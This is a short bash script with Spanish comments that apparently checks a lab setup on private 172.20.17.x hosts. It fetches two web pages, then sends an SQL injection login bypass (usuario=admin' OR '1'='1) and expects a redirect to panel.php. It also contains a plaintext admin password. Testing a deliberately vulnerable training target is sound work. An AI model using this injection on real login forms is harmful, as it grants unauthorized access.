#!/bin/bash
echo "=== JAMSEC web (240) ==="
curl -s -m6 http://172.20.17.240/ | grep -o "Ciberseguridad gestionada" | head -1
echo "=== Apex index (230) ==="
curl -s -m6 http://172.20.17.230/ | grep -o "gestoria de confianza" | head -1
echo -n "=== Apex login HTTP: "
curl -s -o /dev/null -w "%{http_code}\n" -m6 http://172.20.17.230/login.php
echo "=== SQLi bypass en login (debe dar 302 a panel.php) ==="
curl -s -o /dev/null -w "HTTP %{http_code}  Location: %{redirect_url}\n" -m6 \
  --data-urlencode "usuario=admin' OR '1'='1" --data-urlencode "password=x" \
  http://172.20.17.230/login.php
echo "=== login normal admin/Apex.2026! (debe dar 302 a panel.php) ==="
curl -s -o /dev/null -w "HTTP %{http_code}  Location: %{redirect_url}\n" -m6 \
  --data-urlencode "usuario=admin" --data-urlencode "password=Apex.2026!" \
  http://172.20.17.230/login.php
